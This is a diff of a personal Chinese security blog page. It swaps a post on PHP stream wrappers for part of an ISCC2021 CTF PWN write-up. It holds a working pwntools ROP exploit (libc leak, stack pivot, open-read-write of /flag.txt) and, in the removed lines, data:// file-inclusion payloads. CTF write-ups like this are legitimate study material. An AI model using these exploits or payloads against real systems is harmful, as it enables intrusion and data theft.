-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line"></span><br><span class="line">即zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]**要用绝对路径+url编码#</span><br></pre></td></tr></table></figure>
+<p>发现 <code>Full RELRO</code>开着，wro……</p>
+<p>但是查阅资料发现<a href="https://gdufs-king.github.io/2020/01/03/%E7%A5%9E%E5%A5%87%E7%9A%84gadget/" target="_blank" rel="noopener">神奇的gadget</a>一文提供了，将真实地址转移到栈上修改的思路。虽然题目中没有这个gadget但是提供了memcpy 函数。</p>
+<p>有根据在大多数libc中read与write的symbols只一个字节不同的特性，同过将read打印到栈上修改成write从而泄露libc。</p>
+<p>然后不知道为啥system无法执行（菜鸡推测是栈上问题），于是用orw（open-read-write）方法强行读取flag文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./full'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.96.88.40',7050)</span></span><br><span class="line">p=process(<span class="string">'./full'</span>)</span><br><span class="line">pppr_addr      = <span class="number">0x08048519</span>     <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_addr   = <span class="number">0x0804851b</span>     <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080483c5</span>     <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">'12cdefghijklmn'</span>+p32(<span class="number">0x0804A040</span>+<span class="number">0x10</span>+<span class="number">0x8</span>)+p8(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">"memcpy"</span>])+p32(pppr_addr)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x8049ff0</span>)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#栈转移</span></span><br><span class="line"></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x1</span>)</span><br><span class="line">pay1+=p32(<span class="number">0x08048518</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x41</span>)+p32(<span class="number">0x40</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x08048504</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">8</span>)+<span class="string">'1111'</span>*<span class="number">4</span>+<span class="string">'2222'</span>*<span class="number">4</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">168</span>+<span class="number">0x0804A040</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">print(len(pay1))<span class="comment">#布局gadget，ret2csu调用write打印真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p8(<span class="number">0xb0</span>))<span class="comment"># yuancheng  #经过爆破发现将read真实地址改为0xb0恰好是write</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.send(p8(0x90)) #本地</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">libcbase = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">read_0=libcbase+libc.dump(<span class="string">'open'</span>)</span><br><span class="line">write_0=libcbase+libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(p32(read_0)+p32(pppr_addr)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">3</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>)+p32(write_0)+<span class="string">'xxxx'</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>))<span class="comment">#orw操作</span></span><br><span class="line"><span class="comment">#p.sendline()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(p32(elf.symbols['read'])+'aaaa'+p32(0)+p32(0x804a240)+p32(0x100))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>(zip只能用绝对路径)</p>
-<p>bzip2://用法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;&#x2F;etc&#x2F;www&#x2F;html&#x2F;file.bz2</span><br><span class="line">也可以相对路径</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</span><br></pre></td></tr></table></figure>
-
-<p>zlib://用法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;&#x2F;etc&#x2F;www&#x2F;html&#x2F;file.gz</span><br><span class="line">也可以相对路径</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;.&#x2F;file.gz</span><br></pre></td></tr></table></figure>
-
-<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>又称为RFC 2397 协议,data://协议在‘allow_url_fopen =on ’与v‘allow_url_include：on’<br>且php 版本大于等于 php5.2 才能生效。</p>
-<p>用法： data://资源类型;编码,内容 （‘data://’也可以写成‘data:’）</p>
-<p>例如：</p>
-<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?a=data://text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h2><p>查找匹配的文件路径模式。</p>
-<p>用法：glob://[文件路径]/[文件名].[文件后缀]</p>
-<p>例如：</p>
-<p><code>glob://ext/spl/examples/*.php</code></p>
-<p>搜索<code>ext/spl/examples/</code>下所有后缀为php的文件.</p>
-<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>phar:// 数据流包装器自 PHP 5.3.0 起开始有效</p>
-<p>用于处理phar文件时,会自动反序列化</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#gopher" target="_blank" rel="noopener">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#gopher</a></p>
-<p><a href="https://blog.csdn.net/whackw/article/details/46448279" target="_blank" rel="noopener">https://blog.csdn.net/whackw/article/details/46448279</a></p>
-<p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php</a></p>
 
       
     </div>
@@ -434,13 +363,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></p>
+        <p><span>本文标题:</span><a href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2020-12-30, 23:22:28</p>
-        <p><span>最后更新:</span>2021-02-27, 20:21:36</p>
+        <p><span>发布时间:</span>2021-05-28, 09:44:14</p>
+        <p><span>最后更新:</span>2021-05-28, 11:13:52</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/" title="对php伪协议的归纳">lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/05/28/ISCC2021%20PWN%20WP/" title="ISCC2021 PWN部分 WP">lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -452,16 +381,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">
-                    flask.request的内置属性总结
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">
-                    HWCTF-华为云场WP
+                <a href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">
+                    ret2dl-resolve利用方法小记
                 </a>
             </div>
         
@@ -473,7 +396,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-s"><span class="toc-text">http(s):&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp-s"><span class="toc-text">ftp(s):&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-stdin-php-stdout-和-php-stderr"><span class="toc-text">php:&#x2F;&#x2F;stdin, php:&#x2F;&#x2F;stdout 和 php:&#x2F;&#x2F;stderr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-output"><span class="toc-text">php:&#x2F;&#x2F;output</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fd"><span class="toc-text">php:&#x2F;&#x2F;fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#字符串过滤器"><span class="toc-text">字符串过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-string-rot13"><span class="toc-text">#1 string.rot13</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-string-toupper"><span class="toc-text">#2 string.toupper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-string-tolower"><span class="toc-text">#3 string.tolower</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-string-strip-tags"><span class="toc-text">#4 string.strip_tags</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#转换过滤器"><span class="toc-text">转换过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-convert-base64-encode"><span class="toc-text">#1 convert.base64-encode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-convert-base64-decode"><span class="toc-text">#2 convert.base64-decode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-convert-quoted-printable-encode"><span class="toc-text">#3 convert.quoted-printable-encode</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-convert-quoted-printable-decode"><span class="toc-text">#4  convert.quoted-printable-decode</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#压缩过滤器"><span class="toc-text">压缩过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-zlib-deflate和-zlib-inflate"><span class="toc-text">#1 zlib.deflate和 zlib.inflate</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-bzip2-compress和-bzip2-decompress"><span class="toc-text">#2 bzip2.compress和 bzip2.decompress</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#加密过滤器"><span class="toc-text">加密过滤器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-bzip2-zlib"><span class="toc-text">zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glob"><span class="toc-text">glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#M78"><span class="toc-text">M78</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Box"><span class="toc-text">Box</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-text">game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#full"><span class="toc-text">full</span></a></li></ol>
         
     </div>
     <style>
@@ -509,7 +432,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"对php伪协议的归纳　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ISCC2021 PWN部分 WP　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -529,15 +452,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/" title="上一篇: flask.request的内置属性总结">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/" title="下一篇: HWCTF-华为云场WP">
+            <a href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/" title="下一篇: ret2dl-resolve利用方法小记">
                 <i class="fa fa-angle-right"></i>
             </a>
         
